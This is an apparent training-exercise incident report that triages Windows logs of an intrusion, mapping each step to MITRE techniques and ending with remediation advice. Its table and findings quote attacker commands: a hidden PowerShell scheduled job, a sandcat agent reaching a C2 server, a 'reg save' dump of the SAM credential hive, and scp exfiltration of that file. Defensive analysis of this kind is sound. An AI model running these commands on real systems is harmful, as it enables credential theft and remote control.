**Title: Log Triage Analysis**

**Group/Name: James Jolley**

**Indicators and Technical Details**

| Datetime | Identifier (IP, Domain, URL, Hostname) | MITRE Technique ID | Analyst Comment |
| ----- | ----- | ----- | ----- |
| Mar 30, 2022 @ 17:15:12.298 | **powershell.exe** powershell.exe \-NoLogo \-NonInteractive \-WindowStyle Hidden \-Command "Import-Module PSScheduledJob; $jobDef \= \[Microsoft.PowerShell.ScheduledJob.ScheduledJobDefinition\]::LoadFromStore('CDA Adversary Framework', 'C:\\Users\\Administrator\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\ScheduledJobs'); $jobDef.Run()" |  **T1053** Scheduled Task/Job | Creating and running a new scheduled job from ‘cda adversary framework’  using powershell. |
| Mar 30, 2022 @ 17:15:40.860 | "C:\\Users\\Public\\sandcat.go-windows.exe" \-server hxxps[://]caldera[.]le-priv[.]com \-group red | **T1219** Remote Access Software |  |
| Mar 30, 2022 @ 17:16:48.635	 | **rdpclip.exe** | **T0886** Remote Services | (**Analyst note:** this is the evidence for the attacker using rdp to access the system as tmctestface.) |
| Mar 30, 2022 @ 17:19:38.176 | **rundll32.exe** "C:\\Windows\\SysWOW64\\rundll32.exe" iesetup.dll,IEHardenMachineNow u |  **T1562.001** Impair Defenses: Disable or Modify Tools | tmctestface user running a command to disable enhanced security configurations in internet explorer. |
| Mar 30, 2022 @ 17:26:05.290	 | **processhacker-2.39-setup.exe** "C:\\Users\\tmctestface\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\RC0JXGDO\\processhacker-2.39-setup.exe"  | **T1588.002** Obtain Capabilities: Tool | Installing processhacker 2.39 |
| Mar 30, 2022 @ 17:32:39.002 | **reg.exe** "C:\\Windows\\system32\\reg.exe" save hklm\\sam c:\\temp\\sam.save	 | **T1005** Data from Local System | Saving a copy of the sam database to the /tmp directory. (**Analyst note:** user for this was tmctestface) |
| Mar 30, 2022 @ 17:35:04.39 | **scp.exe** "C:\\Windows\\System32\\OpenSSH\\scp.exe" .\\sam Administrator@10.20.8\[.\]14:C:\\ | **T1048** Exfiltration Over Alternative Protocol | Using SCP to exfiltrate the sam database. (**Analyst note:** the destination IP address is on the local network Administrator@10.20.8.14) |

**Executive Summary**

On March 30, 2022 we received an alert for a suspected compromise of one of our company computers. Upon investigation we found extensive signs of compromise, as well as indicators that this was part of a larger compromise on our network. We were able to identify the malicious activity and remediate the affected systems, however we did confirm that the attackers were able to exfiltrate sensitive user credentials and are recommending all passwords be immediately cycled to prevent this from causing further incidents going forward. We have identified the methods the attackers used to gain access, have remediated the issues, and are monitoring for further signs of compromise. 

**Technical Summary**

On March 30, 2022 we received an alert for workstation EC2AMAZ-D46OILK that some of the hardening settings on Internet Explorer had been removed, and unauthorized applications were potentially being downloaded. Upon deeper analysis we found the attacker had created a scheduled job using powershell, and executed sandcat.go to connect to a caldera c2 framework. Following that the attacker pivoted to the tmctestface user and disabled security settings on internet explorer, and then proceeded to download and install processhacker-2.39. Although this does not appear to have been the case in this instance, processhacker has been known to be used to disable security monitoring and logging applications on compromised hosts. From there the attacker created a copy of the HKLM\\sam to /tmp/sam and used scp to copy the file to Administrator@10.20.8\[.\]14. 87

(**Analyst Comment:**  based on the disjointed nature of the activity it is the theory of the analyst that we may be observing the activities of either A: an internal penetration test or B: two separate attackers on our system. However this is only speculation at this point as we have no concrete proof supporting this.)

**Findings and Analysis**

We noticed the administrator user creating and running a scheduled job from powershell loading from “CDA Adversary Framework”.(Figure 1\) Furthermore we observed them starting sandcat.go to connect to the caldera c2 framework ( Figure 2). This indicated that the Administrator account was already compromised on the host.

*Figure 1- using powershell to create and run a new scheduled job from “CDA Adversary Framework” store.*

![image1](https://github.com/jjolley91/Log_Triage/blob/main/Log_triage_imgs/image1.png)

*Figure 2- Administrator user running sandcat.go*

![image2](https://github.com/jjolley91/Log_Triage/blob/main/Log_triage_imgs/image2.png)

Following this activity, the attacker changed accounts and logged in as ‘tmctestface’ using rdp as noted by the use of rdpclip (Figure 4). We found tmctestface using rundll32.exe to disable enhanced security configurations in internet explorer.(Figure 3\)

*Figure 3- Using rundll32.exe to disable security config in IE.*

*![image3](https://github.com/jjolley91/Log_Triage/blob/main/Log_triage_imgs/image3.png)*

*Figure 4- logging in using rdp*

*![image4](https://github.com/jjolley91/Log_Triage/blob/main/Log_triage_imgs/image4.png)*

We discovered that after they disabled the security settings on internet explorer, they then downloaded and ran processhacker 2.39 on the system. (Figure 5). Process hacker has been known to be used for disabling security features and logging in the past, although that does not appear to have been the case in this instance given that we were still able to log activity following this.

*Figure 5- downloaded and installed process hacker 2.39*

*![image5](https://github.com/jjolley91/Log_Triage/blob/main/Log_triage_imgs/image5.png)*

Upon viewing the intrusion detection alerts we discovered that the user tmctestface had copied the sam database to the /tmp directory and used scp to exfiltrate it to a domain joined computer in the Administrator’s C:\\ directory. (Figure 6\)  Interestingly, they do not seem to have copied or exfiltrated the system, or security hives which would normally be seen during this type of attack.

*Figure 6 \- tmctestface copying and exfiltrating the sam database from the host computer.*

![image6](https://github.com/jjolley91/Log_Triage/blob/main/Log_triage_imgs/image6.png)

**Remediation and Recommendations**

**Remove malicious programs:**

	Remove process hacker from the system

	Remove user tmctestface from the system

	Remove sandcat.go from the system

	Delete the created scheduled job from the system

	Rotate all user passwords

	Unless rdp is strictly necessary, disable access to it on machines.

**and/or**

	Reimage the affected machines

	Rotate all user passwords

	Monitor for further signs of compromise.

Monitor other machines on the local network for signs of compromise, as the ip address used to exfiltrate the sam hive was on the local domain, indicating other machines may also be compromised.

Create rules in ELK to alert on the activity seen in this incident, and increase visibility on our network.

**References**

[**https://medium.com/tensult/disable-internet-explorer-enhanced-security-configuration-in-windows-server-2019-a9cf5528be65**](https://medium.com/tensult/disable-internet-explorer-enhanced-security-configuration-in-windows-server-2019-a9cf5528be65)
